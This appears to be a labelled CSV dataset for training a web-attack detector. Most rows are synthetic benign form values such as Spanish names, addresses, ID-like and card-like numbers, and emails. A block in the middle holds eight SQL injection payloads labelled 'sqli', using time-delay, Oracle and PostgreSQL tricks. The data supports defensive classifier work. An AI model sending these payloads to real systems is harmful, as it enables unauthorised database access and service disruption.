payload,label,attack_type
40184,benign,norm
nuda drudes,benign,norm
"c/ del ferrocarril, 152,",benign,norm
2070765320009143,benign,norm
1902,benign,norm
ulldemol bujeque,benign,norm
plaa caudillo 60,benign,norm
maala8,benign,norm
peuela sains,benign,norm
"c/ 57 15, 9g",benign,norm
empeltre,benign,norm
estantalar,benign,norm
21924971z,benign,norm
25260,benign,norm
h9655,benign,norm
dunlap-leaud@videospornocaseros.ye,benign,norm
"pobla de montorns, la",benign,norm
kong-que,benign,norm
goggin,benign,norm
plebs cadevall,benign,norm
cueva de montesinos 80 11-g,benign,norm
xiangsen,benign,norm
01633578a,benign,norm
5562206225092204,benign,norm
4377,benign,norm
molledo basagaa,benign,norm
carretera de las ermitas 188,benign,norm
lauriaul,benign,norm
nype.shafer@canovash.bv,benign,norm
merindad de ro ubierna,benign,norm
robieux,benign,norm
darby,benign,norm
thalasso.chappell@titulosoficiales.jp,benign,norm
0350022340129740,benign,norm
julisa,benign,norm
03266253t,benign,norm
0992218178104844,benign,norm
5788,benign,norm
graziana,benign,norm
16648,benign,norm
07u8e37ia,benign,norm
07901950r,benign,norm
39638,benign,norm
portal,benign,norm
marino,benign,norm
c/ garcia morente 129,benign,norm
2533839429419532,benign,norm
natn,benign,norm
68201502q,benign,norm
36680,benign,norm
*r6t58a,benign,norm
r8cid0va,benign,norm
14977979b,benign,norm
45183,benign,norm
d2s7sp79ro,benign,norm
spiegel-haake@convention.no,benign,norm
turcia,benign,norm
r92e1*56e,benign,norm
pu6ue97,benign,norm
72367579b,benign,norm
1721278325772936,benign,norm
starr-fjelmose@cdgranadabaila.travel,benign,norm
47815,benign,norm
2354,benign,norm
raian,benign,norm
78977050h,benign,norm
24224,benign,norm
58772485x,benign,norm
39515,benign,norm
zanquita,benign,norm
14ab214c6n,benign,norm
quartet@cabare.com.cs,benign,norm
espluga de francol l',benign,norm
acre,benign,norm
52137467d,benign,norm
31282,benign,norm
62si27t8ico,benign,norm
encrasar,benign,norm
86943454g,benign,norm
lubna,benign,norm
pealver palenzuela,benign,norm
zabalza,benign,norm
erickson,benign,norm
procacci,benign,norm
conde,benign,norm
25330,benign,norm
mialgi5,benign,norm
pablo iglesias s/n 2?f,benign,norm
technoso,benign,norm
briseboi,benign,norm
39699852n,benign,norm
37115,benign,norm
comisorio,benign,norm
pesche@campodegolf.com.sy,benign,norm
valseca,benign,norm
419747iv6,benign,norm
orientalista,benign,norm
sala@mystyleperfume.ls,benign,norm
7771884953425478,benign,norm
telema,benign,norm
25109956m,benign,norm
45370,benign,norm
arrego76arse,benign,norm
1i6p06ej7,benign,norm
54709157t,benign,norm
1571256483586961,benign,norm
sibonet,benign,norm
"estrada mendiarte s/n, 10?a",benign,norm
sa89gn,benign,norm
cojera,benign,norm
calle madagascar 130,benign,norm
ineluctable,benign,norm
pozzetto@miplat.am,benign,norm
cervera de la caada,benign,norm
havis,benign,norm
cooksey,benign,norm
gomero gallardo,benign,norm
"paratge ter, 33,",benign,norm
vial,benign,norm
37905890g,benign,norm
40529,benign,norm
encalador,benign,norm
ten.tar,benign,norm
vitola@23horas.ad,benign,norm
45810,benign,norm
desconsolar,benign,norm
infante juan manuel s/n 5?a,benign,norm
9738066615220073,benign,norm
blondell3,benign,norm
peller@arvigar.gs,benign,norm
49135,benign,norm
escultrico,benign,norm
69634179t,benign,norm
6689689469452036,benign,norm
3318,benign,norm
salgado pladellorens,benign,norm
villadoz,benign,norm
8ienne2s6,benign,norm
horcajo de montemayor,benign,norm
sensualmente,benign,norm
fabrizio,benign,norm
"c/ gravina, s/n",benign,norm
6453670410602968,benign,norm
iraola rudi,benign,norm
castellanos de zapardiel,benign,norm
-3136%') or 3400=6002,malicious,sqli
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,malicious,sqli
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",malicious,sqli
-2604)) as sekb where 6897=6897 or 1000=7683,malicious,sqli
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,malicious,sqli
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",malicious,sqli
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,malicious,sqli
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
tweddle,benign,norm
sirevici,benign,norm
90230020p,benign,norm
6034871098442134,benign,norm
vingelli9@custombikesclothes.fr,benign,norm
fuentelmonge,benign,norm
m*ule38,benign,norm
cimorra,benign,norm
knippenberg@soyriojano.cf,benign,norm
iza,benign,norm
martinn sampayo,benign,norm
"calle plantio, 178,",benign,norm
benning,benign,norm
sask,benign,norm
rudie@deuxmanagement.jo,benign,norm
guilas,benign,norm
ramblizo,benign,norm
8043015940180984,benign,norm
6087,benign,norm
stoeckel@hacia.sa,benign,norm
tossa de mar,benign,norm
rescisorio,benign,norm
valdemaluque,benign,norm
masahiro,benign,norm
humfrey,benign,norm
brines grimalda,benign,norm
"calle hernan cortes, 58,",benign,norm
38i2t702,benign,norm
"c/ reina del cielo 136, 8-d",benign,norm
09ca93a4i9lar,benign,norm
70p89c9cion958,benign,norm
drozdek.waechter@tarifasdevuelos.bj,benign,norm
villacastn,benign,norm
hans,benign,norm
30666350j,benign,norm
12965,benign,norm
vivie4,benign,norm
colosse@velaconsultores.gob,benign,norm
fuente de pedro naharro,benign,norm
inusitado,benign,norm
69557398q,benign,norm
beilul,benign,norm
hadel,benign,norm
brivio,benign,norm
ansa-sobrarbe,benign,norm
rebalg1r,benign,norm
88426780z,benign,norm
34111,benign,norm
2268,benign,norm
47355557y,benign,norm
5393761266970595,benign,norm
leonila,benign,norm
49511678s,benign,norm
08191,benign,norm
rosoli,benign,norm
tr?abal,benign,norm
plaza tilos s/n,benign,norm
7578225963562090,benign,norm
helano,benign,norm
20847295a,benign,norm
14140,benign,norm
544,benign,norm
arn cantisn,benign,norm
langa del castillo,benign,norm
jaswal,benign,norm
limongi diguez,benign,norm
pleitas,benign,norm
arme!lluela,benign,norm
menju,benign,norm
23251820q,benign,norm
06927,benign,norm
ezequiel,benign,norm
"calle alfaz del pi, 96 11?d",benign,norm
8198356178876064,benign,norm
3880,benign,norm
97230292t,benign,norm
28194,benign,norm
leonelo,benign,norm
83217349z,benign,norm
3413347210986966,benign,norm
3040,benign,norm
hindman@primeracasa-ebs.il,benign,norm
alarba,benign,norm
cowart,benign,norm
garrudo castellon,benign,norm
"calle pea 49, 9?b",benign,norm
merriell,benign,norm
alvean,benign,norm
16574331w,benign,norm
33001,benign,norm
roehn.kernke@eldeseodepecar.ec,benign,norm
8914644367191799,benign,norm
2049,benign,norm
hirn,benign,norm
"c/ mirra 25,",benign,norm
8648898617825850,benign,norm
nimia,benign,norm
"inocencia alayon, s/n 4-f",benign,norm
3227728964471059,benign,norm
3244,benign,norm
amarili,benign,norm
"c/ general merry del val, s/n",benign,norm
wa77en,benign,norm
50513,benign,norm
c7ada98o,benign,norm
tolera9lemen8e,benign,norm
byron@vinavilano.gl,benign,norm
45790,benign,norm
descote,benign,norm
14554532v,benign,norm
muth,benign,norm
neufeld,benign,norm
benson-rabasa@mareventsprotocolosocial.ad,benign,norm
urdiales del pramo,benign,norm
oti sineiro,benign,norm
avellanosa de mu,benign,norm
teddie,benign,norm
583opi4,benign,norm
radir@diagnosticoradiologico.mil,benign,norm
galende,benign,norm
vacher,benign,norm
77232447b,benign,norm
5399041434530750,benign,norm
8516,benign,norm
einar,benign,norm
"c/ la hoz, 17",benign,norm
sandie,benign,norm
pavlow@permutatucasa.fm,benign,norm
